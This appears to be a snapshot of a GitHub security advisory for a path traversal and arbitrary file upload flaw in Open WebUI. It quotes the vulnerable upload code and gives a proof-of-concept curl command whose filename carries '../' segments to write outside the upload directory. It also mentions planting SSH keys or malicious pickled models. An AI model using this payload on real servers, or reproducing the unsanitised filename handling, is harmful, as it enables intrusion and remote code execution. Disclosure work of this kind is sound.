@@ -1,0 +1,364 @@
+- generic [ref=e2]:
+  - generic [ref=e3]:
+    - link "Skip to content" [ref=e4] [cursor=pointer]:
+      - /url: "#start-of-content"
+    - banner [ref=e6]:
+      - heading "Navigation Menu" [level=2] [ref=e7]
+      - generic [ref=e8]:
+        - link "Homepage" [ref=e10] [cursor=pointer]:
+          - /url: /
+          - img [ref=e11]
+        - generic [ref=e13]:
+          - navigation "Global" [ref=e16]:
+            - list [ref=e17]:
+              - listitem [ref=e18]:
+                - button "Platform" [ref=e20] [cursor=pointer]:
+                  - text: Platform
+                  - img [ref=e21]
+              - listitem [ref=e23]:
+                - button "Solutions" [ref=e25] [cursor=pointer]:
+                  - text: Solutions
+                  - img [ref=e26]
+              - listitem [ref=e28]:
+                - button "Resources" [ref=e30] [cursor=pointer]:
+                  - text: Resources
+                  - img [ref=e31]
+              - listitem [ref=e33]:
+                - button "Open Source" [ref=e35] [cursor=pointer]:
+                  - text: Open Source
+                  - img [ref=e36]
+              - listitem [ref=e38]:
+                - button "Enterprise" [ref=e40] [cursor=pointer]:
+                  - text: Enterprise
+                  - img [ref=e41]
+              - listitem [ref=e43]:
+                - link "Pricing" [ref=e44] [cursor=pointer]:
+                  - /url: https://github.com/pricing
+                  - generic [ref=e45]: Pricing
+          - generic [ref=e46]:
+            - button "Search or jump to…" [ref=e49] [cursor=pointer]:
+              - img [ref=e51]
+            - link "Sign in" [ref=e54] [cursor=pointer]:
+              - /url: /login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-9pgh-j74g-qj6m
+            - link "Sign up" [ref=e55] [cursor=pointer]:
+              - /url: /signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header
+            - button "Appearance settings" [ref=e58] [cursor=pointer]:
+              - img
+  - main [ref=e61]:
+    - generic [ref=e62]:
+      - navigation "Breadcrumb" [ref=e63]:
+        - list [ref=e64]:
+          - listitem [ref=e65]:
+            - link "GitHub Advisory Database" [ref=e66] [cursor=pointer]:
+              - /url: /advisories
+          - listitem [ref=e67]:
+            - link "GitHub Reviewed" [ref=e68] [cursor=pointer]:
+              - /url: /advisories?query=type%3Areviewed
+          - listitem [ref=e69]:
+            - link "CVE-2026-44566" [ref=e70]:
+              - /url: /advisories/GHSA-9pgh-j74g-qj6m
+      - generic [ref=e71]:
+        - heading "Open WebUI Vulnerable to Arbitrary File Upload and Path Traversal" [level=2] [ref=e72]
+        - generic [ref=e73]:
+          - 'generic "Severity: high" [ref=e74]': High severity
+          - generic [ref=e75]: GitHub Reviewed
+          - generic [ref=e76]:
+            - text: Published May 5, 2026on May 5 in
+            - link "open-webui/open-webui" [ref=e77] [cursor=pointer]:
+              - /url: /open-webui/open-webui
+            - text: • Updated May 19, 2026on May 19
+      - navigation "Advisory" [ref=e78]:
+        - tablist [ref=e79]:
+          - tab "Vulnerability details" [selected] [ref=e80] [cursor=pointer]
+          - tab "Dependabot alerts 0" [ref=e81] [cursor=pointer]:
+            - text: Dependabot alerts
+            - generic "0" [ref=e82]
+      - generic [ref=e83]:
+        - generic [ref=e84]:
+          - generic [ref=e87]:
+            - generic [ref=e88]:
+              - heading "Package" [level=2] [ref=e89]
+              - generic [ref=e90]:
+                - img "pip" [ref=e92]
+                - text: open-webui
+                - generic [ref=e95]:
+                  - text: (
+                  - link "pip" [ref=e96] [cursor=pointer]:
+                    - /url: /advisories?query=ecosystem%3Apip
+                  - text: )
+            - generic [ref=e97]:
+              - heading "Affected versions" [level=2] [ref=e98]
+              - generic [ref=e99]: <= 0.1.123
+            - generic [ref=e100]:
+              - heading "Patched versions" [level=2] [ref=e101]
+              - generic [ref=e102]: 0.1.124
+          - generic [ref=e103]:
+            - heading "Description" [level=2] [ref=e105]
+            - generic [ref=e107]:
+              - heading "CONFIDENTIAL" [level=1] [ref=e108]:
+                - strong [ref=e109]: CONFIDENTIAL
+              - heading "KL-CAN-2024-002" [level=1] [ref=e110]
+              - heading "Vulnerability Details" [level=2] [ref=e111]
+              - table [ref=e113]:
+                - rowgroup [ref=e114]:
+                  - row "# Field Value" [ref=e115]:
+                    - columnheader "#" [ref=e116]
+                    - columnheader "Field" [ref=e117]
+                    - columnheader "Value" [ref=e118]
+                - rowgroup [ref=e119]:
+                  - row "1 Discoverer Jaggar Henry & Sean Segreti of KoreLogic, Inc." [ref=e120]:
+                    - cell "1" [ref=e121]
+                    - cell "Discoverer" [ref=e122]:
+                      - strong [ref=e123]: Discoverer
+                    - cell "Jaggar Henry & Sean Segreti of KoreLogic, Inc." [ref=e124]
+                  - row "2 Date Submitted 2024.03.12" [ref=e125]:
+                    - cell "2" [ref=e126]
+                    - cell "Date Submitted" [ref=e127]:
+                      - strong [ref=e128]: Date Submitted
+                    - cell "2024.03.12" [ref=e129]
+                  - row "3 Title Open WebUI Arbitrary File Upload + Path Traversal" [ref=e130]:
+                    - cell "3" [ref=e131]
+                    - cell "Title" [ref=e132]:
+                      - strong [ref=e133]: Title
+                    - cell "Open WebUI Arbitrary File Upload + Path Traversal" [ref=e134]
+                  - row "5 Affected Vendor Open WebUI" [ref=e135]:
+                    - cell "5" [ref=e136]
+                    - cell "Affected Vendor" [ref=e137]:
+                      - strong [ref=e138]: Affected Vendor
+                    - cell "Open WebUI" [ref=e139]
+                  - row "6 Affected Product(s) Open WebUI (Formerly Ollama WebUI)" [ref=e140]:
+                    - cell "6" [ref=e141]
+                    - cell "Affected Product(s)" [ref=e142]:
+                      - strong [ref=e143]: Affected Product(s)
+                    - cell "Open WebUI (Formerly Ollama WebUI)" [ref=e144]
+                  - row "7 Affected Version(s) 0.1.105" [ref=e145]:
+                    - cell "7" [ref=e146]
+                    - cell "Affected Version(s)" [ref=e147]:
+                      - strong [ref=e148]: Affected Version(s)
+                    - cell "0.1.105" [ref=e149]
+                  - row "8 Platform/OS Debian GNU/Linux 12 (bookworm)" [ref=e150]:
+                    - cell "8" [ref=e151]
+                    - cell "Platform/OS" [ref=e152]:
+                      - strong [ref=e153]: Platform/OS
+                    - cell "Debian GNU/Linux 12 (bookworm)" [ref=e154]
+                  - row "9 Vector HTTP web interface" [ref=e155]:
+                    - cell "9" [ref=e156]
+                    - cell "Vector" [ref=e157]:
+                      - strong [ref=e158]: Vector
+                    - cell "HTTP web interface" [ref=e159]
+                  - 'row "10 CWE CWE-22: Improper Limitation of a Pathname to a Restricted Directory (''Path Traversal''), CWE-434: Unrestricted Upload of File with Dangerous Type" [ref=e160]':
+                    - cell "10" [ref=e161]
+                    - cell "CWE" [ref=e162]:
+                      - strong [ref=e163]: CWE
+                    - 'cell "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (''Path Traversal''), CWE-434: Unrestricted Upload of File with Dangerous Type" [ref=e164]'
+              - separator [ref=e165]
+              - heading "4. High-level Summary" [level=2] [ref=e166]
+              - paragraph [ref=e167]: Attacker controlled files can be uploaded to arbitrary locations on the web server's filesystem by abusing a path traversal vulnerability.
+              - separator [ref=e168]
+              - heading "11. Technical Analysis" [level=2] [ref=e169]
+              - paragraph [ref=e170]: When attaching files to a prompt by clicking the plus sign (+) on the left of the message input box when using the Open WebUI HTTP interface, the file is uploaded to a static upload directory.
+              - paragraph [ref=e171]: The name of the file is derived from the original HTTP upload request and is not validated or sanitized. This allows for users to upload files with names containing dot-segments in the file path and traverse out of the intended uploads directory. Effectively, users can upload files anywhere on the filesystem the user running the web server has permission.
+              - paragraph [ref=e172]:
+                - text: This can be visualized by examining the python code for the
+                - code [ref=e173]: /rag/api/v1/doc
+                - text: "API route:"
+              - generic [ref=e175]:
+                - generic [ref=e176]: "@app.post(\"/doc\")"
+                - text: "def store_doc( collection_name: Optional[str] = Form(None), file: UploadFile = File(...), user=Depends(get_current_user), ): # \"https://www.gutenberg.org/files/1727/1727-h/1727-h.htm\" print(file.content_type) try: filename = file.filename file_path ="
+                - generic [ref=e177]:
+                  - text: f"
+                  - generic [ref=e178]: "{UPLOAD_DIR}"
+                  - text: /
+                  - generic [ref=e179]: "{filename}"
+                  - text: "\""
+                - text: "contents = file.file.read() with open(file_path, \"wb\") as f: f.write(contents) f.close()"
+              - paragraph [ref=e180]:
+                - text: The
+                - code [ref=e181]: file
+                - text: variable is a representation of the multipart form data contained within the HTTP POST request. The
+                - code [ref=e182]: filename
+                - text: variable is derived from the uploaded file name and is not validated before writing the file contents to disk.
+              - paragraph [ref=e183]:
+                - text: This can be used to upload malicious models. These models are often distributed as pickled python objects and can be leveraged to execute arbitrary python bytecode once deserialized. Alternatively, an attacker can leverage existing services, such as SSH, to upload an attacker controlled
+                - code [ref=e184]: authorized_keys
+                - text: file to remotely connect to the machine.
+              - separator [ref=e185]
+              - heading "12. Proof-of-Concept" [level=2] [ref=e186]
+              - paragraph [ref=e187]: "Execute the following cURL command:"
+              - generic [ref=e189]:
+                - text: TARGET_URI=
+                - generic [ref=e190]: "'https://redacted.com'"
+                - text: ; JWT=
+                - generic [ref=e191]: "'redacted'"
+                - text: ; LOCAL_FILE=
+                - generic [ref=e192]: "'/tmp/file_to_upload.txt'"
+                - text: \ curl -H
+                - generic [ref=e193]: "\"Authorization: Bearer $JWT\""
+                - text: "-F"
+                - generic [ref=e194]: "\"file=$LOCAL_FILE;filename=../../../../../../../../../../tmp/pwned.txt\""
+                - generic [ref=e195]: "\"$TARGET_URI/rag/api/v1/doc\""
+              - paragraph [ref=e196]:
+                - text: Verify the file
+                - code [ref=e197]: pwned.txt
+                - text: exists in the
+                - code [ref=e198]: /tmp/
+                - text: "directory on the machine hosting the web server:"
+              - generic [ref=e200]: ollama@webserver:~$ cat /tmp/pwned.txt korelogic ollama@webserver:~$
+              - heading "References" [level=3] [ref=e201]
+              - list [ref=e202]:
+                - listitem [ref=e203]:
+                  - link "GHSA-9pgh-j74g-qj6m" [ref=e204] [cursor=pointer]:
+                    - /url: https://github.com/open-webui/open-webui/security/advisories/GHSA-9pgh-j74g-qj6m
+                - listitem [ref=e205]:
+                  - link "https://nvd.nist.gov/vuln/detail/CVE-2026-44566" [ref=e206] [cursor=pointer]:
+                    - /url: https://nvd.nist.gov/vuln/detail/CVE-2026-44566
+          - generic [ref=e207]:
+            - img [ref=e209]
+            - generic [ref=e211]:
+              - link "@doge-woof" [ref=e212] [cursor=pointer]:
+                - /url: /apps/doge-woof
+                - img "@doge-woof" [ref=e213]
+              - link "doge-woof" [ref=e214] [cursor=pointer]:
+                - /url: /apps/doge-woof
+              - text: published to
+              - link "open-webui/open-webui" [ref=e215] [cursor=pointer]:
+                - /url: /open-webui/open-webui/security/advisories/GHSA-9pgh-j74g-qj6m
+              - text: May 5, 2026on May 5
+          - generic [ref=e216]:
+            - img [ref=e218]
+            - generic [ref=e220]: Published to the GitHub Advisory Database May 8, 2026on May 9
+          - generic [ref=e221]:
+            - img [ref=e223]
+            - generic [ref=e225]: Reviewed May 8, 2026on May 9
+          - generic [ref=e226]:
+            - img [ref=e228]
+            - generic [ref=e230]:
+              - text: Published by the
+              - link "National Vulnerability Database" [ref=e231] [cursor=pointer]:
+                - /url: https://nvd.nist.gov/vuln/detail/CVE-2026-44566
+              - text: May 15, 2026on May 16
+          - generic [ref=e232]:
+            - img [ref=e234]
+            - generic [ref=e236]: Last updated May 19, 2026on May 19
+        - generic [ref=e237]:
+          - generic [ref=e238]:
+            - heading "Severity" [level=3] [ref=e239]
+            - generic [ref=e240]:
+              - 'generic "Severity: high" [ref=e241]': High
+              - generic [ref=e242]:
+                - button "7.3" [ref=e244] [cursor=pointer]:
+                  - generic [ref=e246]: "7.3"
+                - generic [ref=e247]: / 10
+            - generic [ref=e248]:
+              - heading "CVSS v3 base metrics" [level=4] [ref=e249]
+              - generic [ref=e250]:
+                - text: Attack vector
+                - generic [ref=e251]: Network
+              - generic [ref=e252]:
+                - text: Attack complexity
+                - generic [ref=e253]: Low
+              - generic [ref=e254]:
+                - text: Privileges required
+                - generic [ref=e255]: None
+              - generic [ref=e256]:
+                - text: User interaction
+                - generic [ref=e257]: None
+              - generic [ref=e258]:
+                - text: Scope
+                - generic [ref=e259]: Unchanged
+              - generic [ref=e260]:
+                - text: Confidentiality
+                - generic [ref=e261]: Low
+              - generic [ref=e262]:
+                - text: Integrity
+                - generic [ref=e263]: Low
+              - generic [ref=e264]:
+                - text: Availability
+                - generic [ref=e265]: Low
+              - button "Learn more about base metrics" [ref=e267] [cursor=pointer]:
+                - generic [ref=e269]: Learn more about base metrics
+            - generic [ref=e270]: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+          - generic [ref=e271]:
+            - heading "EPSS score" [level=3] [ref=e272]
+            - generic [ref=e273]:
+              - button "0.079%" [ref=e275] [cursor=pointer]:
+                - generic [ref=e278]: 0.079%
+              - generic [ref=e279]: (24th percentile)
+          - generic [ref=e280]:
+            - heading "Weaknesses" [level=3] [ref=e281]
+            - group [ref=e283]:
+              - button "Weakness CWE-22" [ref=e284] [cursor=pointer]:
+                - generic [ref=e285]: Weakness
+                - text: CWE-22
+            - group [ref=e287]:
+              - button "Weakness CWE-434" [ref=e288] [cursor=pointer]:
+                - generic [ref=e289]: Weakness
+                - text: CWE-434
+          - generic [ref=e290]:
+            - heading "CVE ID" [level=3] [ref=e291]
+            - generic [ref=e292]: CVE-2026-44566
+          - generic [ref=e293]:
+            - heading "GHSA ID" [level=3] [ref=e294]
+            - generic [ref=e295]: GHSA-9pgh-j74g-qj6m
+          - generic [ref=e296]:
+            - heading "Source code" [level=3] [ref=e297]
+            - link "open-webui/open-webui" [ref=e299] [cursor=pointer]:
+              - /url: https://github.com/open-webui/open-webui
+          - generic [ref=e300]:
+            - heading "Advisory Credits" [level=3] [ref=e301]: Credits
+            - list [ref=e302]:
+              - listitem [ref=e303]:
+                - generic [ref=e304]:
+                  - link "@KoreLogicSecurityDisclosures" [ref=e305] [cursor=pointer]:
+                    - /url: /KoreLogicSecurityDisclosures
+                    - img "@KoreLogicSecurityDisclosures" [ref=e306]
+                  - link "KoreLogicSecurityDisclosures" [ref=e307] [cursor=pointer]:
+                    - /url: /KoreLogicSecurityDisclosures
+                - generic [ref=e309]: Reporter
+          - generic [ref=e310]:
+            - generic [ref=e312]:
+              - generic [ref=e313]:
+                - img [ref=e314]
+                - generic [ref=e317]: Loading
+              - text: Checking history
+            - generic [ref=e318]:
+              - text: See something to contribute?
+              - link "Suggest improvements for this vulnerability" [ref=e319] [cursor=pointer]:
+                - /url: /advisories/GHSA-9pgh-j74g-qj6m/improve
+              - text: .
+  - contentinfo [ref=e320]:
+    - heading "Footer" [level=2] [ref=e321]
+    - generic [ref=e322]:
+      - generic [ref=e323]:
+        - link "GitHub Homepage" [ref=e324] [cursor=pointer]:
+          - /url: https://github.com
+          - img [ref=e325]
+        - generic [ref=e327]: © 2026 GitHub, Inc.
+      - navigation "Footer" [ref=e328]:
+        - heading "Footer navigation" [level=3] [ref=e329]
+        - list "Footer navigation" [ref=e330]:
+          - listitem [ref=e331]:
+            - link "Terms" [ref=e332] [cursor=pointer]:
+              - /url: https://docs.github.com/site-policy/github-terms/github-terms-of-service
+          - listitem [ref=e333]:
+            - link "Privacy" [ref=e334] [cursor=pointer]:
+              - /url: https://docs.github.com/site-policy/privacy-policies/github-privacy-statement
+          - listitem [ref=e335]:
+            - link "Security" [ref=e336] [cursor=pointer]:
+              - /url: https://github.com/security
+          - listitem [ref=e337]:
+            - link "Status" [ref=e338] [cursor=pointer]:
+              - /url: https://www.githubstatus.com/
+          - listitem [ref=e339]:
+            - link "Community" [ref=e340] [cursor=pointer]:
+              - /url: https://github.community/
+          - listitem [ref=e341]:
+            - link "Docs" [ref=e342] [cursor=pointer]:
+              - /url: https://docs.github.com/
+          - listitem [ref=e343]:
+            - link "Contact" [ref=e344] [cursor=pointer]:
+              - /url: https://support.github.com?tags=dotcom-footer
+          - listitem [ref=e345]:
+            - button "Manage cookies" [ref=e347] [cursor=pointer]
+          - listitem [ref=e348]:
+            - button "Do not share my personal information" [ref=e350] [cursor=pointer]
